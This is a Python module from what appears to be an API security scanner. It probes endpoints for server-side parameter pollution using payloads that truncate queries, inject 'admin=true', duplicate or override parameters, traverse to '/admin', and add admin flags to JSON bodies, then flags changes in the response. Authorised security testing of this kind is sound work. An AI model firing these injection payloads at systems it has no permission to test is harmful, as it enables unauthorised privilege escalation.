"""Attack 10: Server-Side Parameter Pollution (SSPP)."""
import json
import sys
import urllib.parse

from ..http_client import HTTPClient
from ..models import Finding, ScanContext


def _log(msg):
    print(f"[*] Attack 10 (SSPP): {msg}", file=sys.stderr)


SSPP_TECHNIQUES = [
    # (label, url_transform, body_transform)
    ("truncation (%23)",
     lambda url, p, v: f"{url}?{p}={v}%23ignored",
     None),
    ("injection (%26admin=true)",
     lambda url, p, v: f"{url}?{p}={v}%26admin=true",
     None),
    ("override (%26{p}=evil)",
     lambda url, p, v: f"{url}?{p}={v}%26{p}=overridden",
     None),
    ("duplicate param",
     lambda url, p, v: f"{url}?{p}={v}&{p}=evil",
     None),
    ("REST path traversal (%2f..%2fadmin)",
     lambda url, p, v: f"{url}?{p}={v}%2f..%2fadmin",
     None),
    ("JSON injection in param",
     None,
     lambda p, v: json.dumps({p: f'{v}","admin":"true'})),
    ("nested object injection",
     None,
     lambda p, v: json.dumps({p: v, "admin": True})),
]


def _baseline_fingerprint(resp):
    """Simple fingerprint for comparison."""
    return (resp.status, resp.length, resp.ctype)


def run_sspp(ctx: ScanContext):
    """Test for server-side parameter pollution."""
    candidates = ctx.endpoints_with_params()
    _log(f"Testing {len(candidates)} endpoints with params")

    client = HTTPClient(timeout=ctx.timeout)
    headers = {}
    if ctx.auth:
        headers["Authorization"] = ctx.auth

    found = 0

    for ep in candidates:
        url = ep.base_url()

        for param, value in ep.params.items():
            if not value:
                value = "test"

            # Get baseline
            baseline_url = f"{url}?{param}={value}"
            baseline = client.request("GET", baseline_url, headers=headers)
            if baseline.status == 0:
                continue
            bl_fp = _baseline_fingerprint(baseline)

            for label, url_fn, body_fn in SSPP_TECHNIQUES:
                if url_fn:
                    # GET-based SSPP
                    test_url = url_fn(url, param, value)
                    resp = client.request("GET", test_url, headers=headers)
                else:
                    # POST-based JSON SSPP
                    body = body_fn(param, value)
                    req_headers = dict(headers)
                    req_headers["Content-Type"] = "application/json"
                    resp = client.request("POST", url, body=body,
                                          headers=req_headers)

                if resp.status == 0:
                    continue

                test_fp = _baseline_fingerprint(resp)

                # Detect behavioral change
                if test_fp != bl_fp:
                    # Status changed or significant length diff
                    status_changed = test_fp[0] != bl_fp[0]
                    length_diff = abs(test_fp[1] - bl_fp[1])

                    if (status_changed and resp.status < 500) or \
                       length_diff > max(50, bl_fp[1] * 0.2):

                        sev = "high" if status_changed else "medium"
                        method = "GET" if url_fn else "POST"
                        ctx.add_finding(Finding(
                            title=f"SSPP: {label} on param '{param}'",
                            severity=sev,
                            category="API10:2023 Unsafe Consumption of APIs",
                            method=method,
                            path=ep.path,
                            host=ep.host,
                            status=resp.status,
                            evidence=f"Baseline: {bl_fp[0]}/{bl_fp[1]}B, "
                                     f"Polluted: {test_fp[0]}/{test_fp[1]}B, "
                                     f"technique: {label}",
                            remediation="Validate and sanitize all parameters. "
                                        "URL-decode once only. "
                                        "Use strict parameter parsing.",
                            attack_phase="sspp"))
                        found += 1
                        break  # one finding per param

    _log(f"SSPP findings: {found}")
